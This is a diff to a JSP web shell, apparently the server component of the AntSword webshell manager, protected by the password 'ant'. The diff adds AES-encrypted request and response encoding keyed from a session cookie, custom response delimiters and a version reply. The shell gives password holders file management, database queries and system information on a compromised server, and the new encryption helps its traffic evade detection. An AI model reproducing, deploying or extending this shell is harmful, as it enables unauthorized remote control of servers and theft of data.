@@ -24,6 +24,9 @@
 已知问题：
  1. 文件管理遇到中文文件名显示的问题
 ChangeLog:
+  v1.7
+    1. 新增 AES 编码/解码 支持 (thx @Ch1ngg)
+    2. 新增 Version, 直接访问不带任何参数会返回当前 shell 的版本号
   v1.6
     1. 新增 4 种解码器支持
   v1.5
@@ -44,21 +47,46 @@ ChangeLog:
    2. mysql 数据库支持
    3. 支持 base64 和 hex 编码
 --%>
-<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*" contentType="text/html;charset=UTF-8"%>
+<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,javax.crypto.*,java.security.*,javax.crypto.spec.*" contentType="text/html;charset=UTF-8"%>
 <%!
-// ################################################
-    String Pwd = "ant";   //连接密码
-    // 数据编码 3 选 1
-    String encoder = "";       // default
-    // String encoder = "base64"; //base64
-    // String encoder = "hex";    //hex(推荐)
-    String cs = "UTF-8"; // 字符编码
-    // 数据解码 4 选 1
-    String decoder = "";
-    // String decoder = "base64"; // base64 中文正常
-    // String decoder = "hex"; // hex 中文可能有问题
-    // String decoder = "hex_base64"; // hex(base64) // 中文正常
-// ################################################
+// #################################################################
+    String Pwd = "ant";         //连接密码
+    // 编码器
+    String encoder = "";               // default (明文)
+    // String encoder = "base64";      // base64
+    // String encoder = "hex";         // hex(推荐)
+    // String encoder = "aes";         // aes(加密方式见下文aes配置)
+
+    // 解码器
+    String decoder = "";               // default (明文)
+    // String decoder = "base64";      // base64 中文正常
+    // String decoder = "hex";         // hex 中文可能有问题
+    // String decoder = "hex_base64";  // hex(base64) // 中文正常
+    // String decoder = "aes_base64";  // aes(base64) (加密方式见下文aes配置)
+    // 其它配置
+    String cs = "UTF-8";                // 字符集编码
+    String SessionKey = "CUSTOMSESSID"; // 自定义sessionkey id
+    String RetS = "LT58";               // 数据起始分割符 base64
+    String RetE = "fDwt";               // 数据结束分割符 base64
+    // aes 加密配置项
+    /*
+    *  aes-128-cfb_zero_padding:
+    *   - aes_mode: CFB
+    *   - aes_padding: NoPadding
+    *   - aes_keylen: 16
+
+    *  aes-256-ecb_zero_padding:
+    *   - aes_mode: ECB
+    *   - aes_padding: NoPadding
+    *   - aes_keylen: 32
+    */
+    String aes_mode = "CFB";            // EBC|ECB|CFB|
+    String aes_padding = "NoPadding";   // NoPadding|PKCS5Padding|PKCS7Padding
+    int aes_keylen = 16;                // 16|32  // 16(AES-128) 32(AES-256)
+    String aes_key_padding = "a";       // 获取到的 key 位数不够时填充字符
+// ################################################################
+    String AesKey = "";
+    String Version = "1.7";
 
     String EC(String s) throws Exception {
         if(encoder.equals("hex") || encoder == "hex") return s;
@@ -369,6 +397,10 @@ ChangeLog:
             return sb;
         }else if(decode.equals("hex_base64") || decode == "hex_base64"){
             return asenc(asenc(str, "base64"), "hex");
+        }else if(decode.equals("aes_base64") || decode == "aes_base64"){
+            String sb1 = "";
+            sb1 = AesEncrypt(AesKey, asenc(str, "base64"));
+            return sb1.replace("\r\n","");
         }
         return str;
     }
@@ -402,8 +434,54 @@ ChangeLog:
             sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
             bt = decoder.decodeBuffer(str);
             return new String(bt,cs);
+        }else if(encode.equals("aes") || encode == "aes") {
+            String str1 = AesDecrypt(AesKey, str);
+            return str1.trim();
         }
         return str;
+    }
+
+    String AesEncrypt(String key, String cleartext) throws Exception {
+        IvParameterSpec zeroIv = new IvParameterSpec(key.getBytes());
+        SecretKeySpec keys = new SecretKeySpec(key.getBytes(), "AES");
+        Cipher cipher = Cipher.getInstance(new String("AES/"+aes_mode+"/"+aes_padding));
+        cipher.init(Cipher.ENCRYPT_MODE, keys, zeroIv);  
+        byte[] encryptedData = cipher.doFinal(cleartext.getBytes("UTF-8"));
+        sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder();
+        String sb = encoder.encode(encryptedData);
+        return sb;
+    }
+
+    String AesDecrypt(String key ,String encrypted) throws Exception {
+        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
+        byte[] byteMi = decoder.decodeBuffer(encrypted);
+        IvParameterSpec zeroIv = new IvParameterSpec(key.getBytes());
+        SecretKeySpec keys = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
+        Cipher cipher = Cipher.getInstance(new String("AES/"+aes_mode+"/"+aes_padding));
+        cipher.init(Cipher.DECRYPT_MODE, keys, zeroIv);
+        byte[] decryptedData = cipher.doFinal(byteMi);
+        return new String(decryptedData, "UTF-8");
+    }
+
+    String getKeyFromCookie(Cookie[] cookies){
+        String key = "";
+        StringBuilder result = new StringBuilder();
+        if( cookies != null ){
+            for (Cookie c : cookies) {
+                if (c.getName().equals(SessionKey)) {
+                    key = c.getValue();
+                    break;
+                }
+            }
+        }
+        if(key.length() < aes_keylen){
+            for(int i=0;key.length() < aes_keylen;i++){
+                key += aes_key_padding;
+            }
+        }if(key.length() > aes_keylen){
+            key = key.substring(0,aes_keylen);
+        }
+        return key;
     }
 
     void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
@@ -420,14 +498,17 @@ ChangeLog:
     response.setCharacterEncoding(cs);
     StringBuffer output = new StringBuffer("");
     StringBuffer sb = new StringBuffer("");
+    Cookie cookie = new Cookie(SessionKey, session.getId());
+    response.addCookie(cookie);
     try {
+        AesKey = getKeyFromCookie(request.getCookies());
         String funccode = EC(request.getParameter(Pwd) + "");
         String z0 = decode(EC(request.getParameter("z0")+""), encoder);
         String z1 = decode(EC(request.getParameter("z1") + ""), encoder);
         String z2 = decode(EC(request.getParameter("z2") + ""), encoder);
         String z3 = decode(EC(request.getParameter("z3") + ""), encoder);
         String[] pars = { z0, z1, z2, z3};
-        output.append("->" + "|");
+        output.append(decode(RetS,"base64"));
 
         if (funccode.equals("B")) {
             sb.append(FileTreeCode(pars[1]));
@@ -463,11 +544,13 @@ ChangeLog:
             sb.append(query(pars[0], pars[1], pars[2]));
         } else if (funccode.equals("A")) {
             sb.append(SysInfoCode(request));
+        }else{
+            sb.append(Version);
         }
     } catch (Exception e) {
         sb.append("ERROR" + ":// " + e.toString());
     }
     output.append(asenc(sb.toString(), decoder));
-    output.append("|" + "<-");
+    output.append(decode(RetE, "base64"));
     out.print(output.toString());
 %>
